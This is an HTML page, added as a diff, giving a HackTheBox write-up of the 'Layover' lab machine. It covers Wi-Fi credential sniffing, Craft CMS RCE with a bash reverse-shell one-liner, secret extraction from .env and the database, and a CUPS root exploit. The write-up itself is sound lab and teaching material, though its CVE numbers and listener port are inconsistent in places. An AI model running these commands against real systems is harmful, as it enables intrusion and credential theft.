@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Layover — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>Layover</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-linux">Linux</span>
+    <span class="diff-tag diff-medium">Medium</span>
+    <span class="wu-date">Pwned: 2026-10-02</span>
+  </div>
+
+  <h2>Machine Info</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>Layover</td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Difficulty</td><td>Medium</td></tr>
+  <tr><td>Status</td><td>Pwned</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Tools Used</h2>
+  <hr>
+  <h2>Summary</h2>
+  <p>Layover is an airport-themed machine simulating a corporate contractor environment, where initial access is gained via RDP using provided contractor credentials. Lateral movement involves passively sniffing unencrypted Wi-Fi traffic on an internal captive-portal network using a pre-configured monitor-mode adapter, capturing plaintext credentials for a frequent-flyer portal user. Those credentials are used to authenticate against a vulnerable Craft CMS instance (CVE-2026-72778), where a <code>condition.config</code> JSON sanitization bypass yields RCE as <code>www-data</code>. The user flag is obtained by extracting a Craft security key from <code>.env</code>, querying a custom database table for an encrypted mail relay password, and decrypting it via Yii&#x27;s native Security component to pivot to the <code>aporter</code> user.</p>
+  <hr>
+  <h2>Reconnaissance</h2>
+  <h3>Initial Scan (NMAP)</h3>
+  <p>As is common in real life pentests, we start the Layover box with credentials for the following account <strong>contractor</strong> / <strong>Contractor2026!</strong></p>
+  <p>Initial reconnaissance of the IP provides the following. The machine is running a ms-wbt-server.</p>
+  <pre><code>…/HTB/Layover ✗ nmap -sC -sV -A layover.htb -oN ./recon/scan_aggressive.txt
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-03 04:07 +0530
+Nmap scan report for layover.htb (10.129.24.125)
+Host is up (0.41s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.64 seconds</code></pre>
+  <p><strong>Open Ports:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>3389</td><td>ms-wbt-server</td><td>N/A</td><td>rdp connects to a linux machine running xfce env with a couple pen testing tools preinstalled such as burpsuite, tshark and tcpdump for network sniffing.</td></tr>
+  <tr><td>N/A</td><td>CraftCMS Solo</td><td>v5.9.8</td><td>CraftCMS 5.9.8 running within the rdp can be accessed with sniffed credentials of public portal which helps exploit a high risk vulnerability, CVE-2026-44011.</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Vulnerability Identification</h2>
+  <h3>Identified Technologies</h3>
+  <div class="table-wrap"><table><thead><tr><th>Technology</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>CraftCMS Solo</td><td>5.9.8</td><td>Vulnerable to RCE if exploited as an authenticated user.</td></tr>
+  <tr><td>CUPS</td><td>2.4.16</td><td>Found later after performing lateral movement to the user.</td></tr>
+  </tbody></table></div>
+  <h3>CVEs / Vulnerabilities Identified</h3>
+  <div class="table-wrap"><table><thead><tr><th>CVE</th><th>Description</th><th>Severity</th></tr></thead><tbody>
+  <tr><td>CVE-2026-44011</td><td>Any authenticated user can achieve arbitrary command execution on the underlying server, fully compromising CIA triad of the Craft CMS host.</td><td>High</td></tr>
+  <tr><td>CVE-2026-34990</td><td>Arbitrary file write as root. Local privilege escalation. Local unprivileged user → <strong>root</strong>, via a leaked CUPS <code>Local</code> authorization token and a policy-bypassing <code>file:///</code> print queue.</td><td></td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Initial Access (RDP)</h2>
+  <p>Initially we access the RDP using the credentials provided by hackthebox for the machine. contractor Contractor2026!</p>
+  <p>Using the provided credentials, we land on an RDP running linux and xfce enviroment. Initial enumeration of the system reveals two wifi adapters with monitor support along with a public wifi signal to which we can connect.</p>
+  <p>We connect to the wifi signal using wlan2 and setup wlan3 for monitoring to sniff any data.</p>
+  <pre><code>sudo ip link set wlan3 down
+sudo iw dev wlan3 set type monitor
+sudo ip link set wlan3 up
+sudo iw dev wlan3 set channel 6 </code></pre>
+  <p>(switched to channel 6 because <code>wlan2</code> was on <code>channel 6</code>)</p>
+  <pre><code>sudo tshark -i wlan3 -w /tmp/wifi_capture.pcap</code></pre>
+  <p>With <code>wlan3</code> on channel 6, tshark started picking up live 802.11 traffic. Almost immediately two interesting packets appeared in the live output:</p>
+  <pre><code>259  10.13.37.132 → 10.13.37.10  HTTP POST /miles/login.php (application/x-www-form-urlencoded)
+770  10.13.37.132 → 10.13.37.10  HTTP POST /miles/login.php (application/x-www-form-urlencoded)</code></pre>
+  <hr>
+  <h2>Post-Exploitation</h2>
+  <h3>System Enumeration</h3>
+  <p>The same login POST being repeated periodically — a simulated user (or automated script) repeatedly submitting credentials to the miles portal over <strong>unencrypted HTTP</strong>, making it trivially sniffable in plaintext.</p>
+  <pre><code>tshark -r /tmp/wifi_capture.pcap -Y &quot;http.request.method == POST&quot; -T fields -e http.file_data</code></pre>
+  <h3>Credential Discovery</h3>
+  <p>This returned the POST body as raw hex-encoded ASCII:</p>
+  <pre><code>757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621</code></pre>
+  <p>which encodes to standard url-encoded form body:</p>
+  <pre><code>username=jenny&amp;password=Fl1ghtDeck2026!</code></pre>
+  <p><strong>Credentials Found:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password</th><th>Hash</th><th>Service</th></tr></thead><tbody>
+  <tr><td>Jenny</td><td>Fl1ghtDeck2026!</td><td>N/A</td><td>portal.international.htb (CraftCMS)</td></tr>
+  </tbody></table></div>
+  <h4>Discovering Craft CMS via Cookies</h4>
+  <p>After logging into the miles portal as jenny (<code>http://10.13.37.10/miles/</code>), the Craft CMS discovery required no directory brute-forcing at all. Simply opening browser DevTools and inspecting the cookies set after jenny&#x27;s successful login revealed two distinctive cookie names:</p>
+  <pre><code>CRAFT_CSRF_TOKEN
+CraftSessionId</code></pre>
+  <p>This single observation immediately fingerprinted the underlying CMS without running a single gobuster or ffuf scan — the application was essentially announcing itself through its own cookie naming conventions.</p>
+  <h4>Attempting Admin Panel Access</h4>
+  <p>With jenny&#x27;s credentials (<code>jenny / Fl1ghtDeck2026!</code>) confirmed working on the front-end miles portal, the natural next step was attempting to log into the Craft CMS control panel at ``<code>portal.international.htb/admin</code>``, which worked and revealed the CraftCMS service version 5.9.8 along with other services information such as MariaDB running on the machine.</p>
+  <hr>
+  <h2>Initial Foothold (CVE-2026-44011)</h2>
+  <p>A public PoC exploit script (<code>exploit.py</code>) automated the exploitation using jenny&#x27;s credentials directly which gave us initial foothold to the server&#x27;s terminal:</p>
+  <pre><code>TERMINAL 1&gt;
+
+python3 exploit.py --base-url http://portal.international.htb -u jenny -p Fl1ghtDeck2026! -c &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.13.37.182/4444 0&gt;&amp;1&quot;&#x27;
+
+TERMINAL 2
+
+nc -nvlp 44441</code></pre>
+  <p>Credits for script: ``<code>https://github.com/4xura/CVE-2026-44011-craftcms-auth-rce</code>``</p>
+  <hr>
+  <h2>Lateral Movement</h2>
+  <h4>Locating the Craft CMS Install</h4>
+  <p>While enumerating CraftCMS admin portal, we discovered a mariaDB service running on the server, after performing initial enum and recon.</p>
+  <p>Since we landed as <code>www-data</code> (the web server user), the most immediately useful thing to enumerate was the application itself — specifically finding where Craft&#x27;s project root sat on disk, since that&#x27;s where sensitive config files like <code>.env</code> live:</p>
+  <pre><code>find / -name &quot;.env&quot; 2&gt;/dev/null
+
+cat /var/www/portal/.env
+# General settings
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DEV_MODE=false
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_DISALLOW_ROBOTS=true
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026
+CRAFT_DB_TABLE_PREFIX=</code></pre>
+  <h4>Database Enumeration</h4>
+  <p>With the DB credentials in hand, querying MariaDB directly:</p>
+  <p>bash</p>
+  <pre><code>mysql -u craftuser -p&#x27;CraftDB_pw_2026&#x27; -h 127.0.0.1 craft -e &quot;SHOW TABLES;&quot;
+
+---SNIP---
+htbairways_setings;
+---SNIP---
+
+mysql -u craftuser -p&#x27;CraftDB_pw_2026&#x27; -h 127.0.0.1 craft -e &quot;SELECT * FROM htbairways_settings;&quot;
+
+id	name	value	dateCreated	dateUpdated
+1	mailRelayPassword	u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=</code></pre>
+  <h4>Decrypting the Stored Secret</h4>
+  <p>Since the blob was encrypted using Craft&#x27;s own <code>Security::encryptByKey()</code> method (tied to <code>CRAFT_SECURITY_KEY</code>), standard command-line decryption tools wouldn&#x27;t work. The solution was writing a minimal PHP script that used Yii&#x27;s underlying <code>Security</code> component directly with the extracted key — bypassing Craft&#x27;s full bootstrap entirely to avoid env-loading issues:</p>
+  <pre><code>&lt;?php
+require &#x27;/var/www/portal/vendor/autoload.php&#x27;;
+
+$key = &#x27;IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr&#x27;;
+$encrypted = base64_decode(&#x27;u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=&#x27;);
+
+$security = new \yii\base\Security();
+$decrypted = $security-&gt;decryptByKey($encrypted, $key);
+echo $decrypted . &quot;\n&quot;;</code></pre>
+  <p>This gave the decoding in stdout as plaintext which was later used on one of the users that we found on the box <code>aporter</code></p>
+  <pre><code>php /tmp/decrypt.php
+
+Skyp0rt_Relay!26</code></pre>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password</th><th>Hash</th><th>Service</th></tr></thead><tbody>
+  <tr><td>aporter</td><td>Skyp0rt_Relay!26</td><td>N/A</td><td>OS user</td></tr>
+  </tbody></table></div>
+  <h3>User Flag</h3>
+  <p>switching user to <code>aporter</code> gives us the user flag.</p>
+  <pre><code>cat ~/user.txt
+
+---CENSORED---</code></pre>
+  <hr>
+  <h2>Privilege Escalation</h2>
+  <h3>Enumeration</h3>
+  <p>Since the environment was isolated with no access to automated tools like linpeas, manual enumeration was necessary. Querying installed packages directly via <code>dpkg</code>:</p>
+  <pre><code>dpkg -l | grep cups</code></pre>
+  <p>This revealed CUPS (Common Unix Printing System) was installed on the box — not something you&#x27;d immediately expect on a web/portal server, making it stand out as an interesting attack surface. Checking the exact version:</p>
+  <pre><code>cups-config --version</code></pre>
+  <p>Which returned <code>2.4.16</code> — a version with a known critical local privilege escalation vulnerability.</p>
+  <h3>Vulnerability: CVE-2026-34990</h3>
+  <h4>Local PrivEsc via arbitrary file write as root</h4>
+  <p>Using a publically available exploit for this vulnerability, we were able to elevate pivot to the root user.</p>
+  <pre><code>python3 exploit.py
+
+[*] user: &lt;local-user&gt;
+[*] target: /etc/sudoers.d/&lt;local-user&gt;-pwn
+[+] Local token: &lt;LOCAL_TOKEN&gt;
+[*] attempt 1: &lt;printer-name&gt;
+[+] ROOT via sudoers
+uid=0(root) gid=0(root) groups=0(root)
+[*] next: sudo -n bash
+
+sudo -n bash</code></pre>
+  <p>Credits for script:  https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC</p>
+  <p><strong>Result:</strong></p>
+  <pre><code>whoami
+# root</code></pre>
+  <h3>Root Flag</h3>
+  <pre><code>---CENSORED---</code></pre>
+  <hr>
+  <h2>Trophy</h2>
+  <pre><code>https://labs.hackthebox.com/achievement/machine/1574945/984</code></pre>
+  <p><em>Completed as part of HackTheBox practice in a legal, controlled environment.</em></p>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
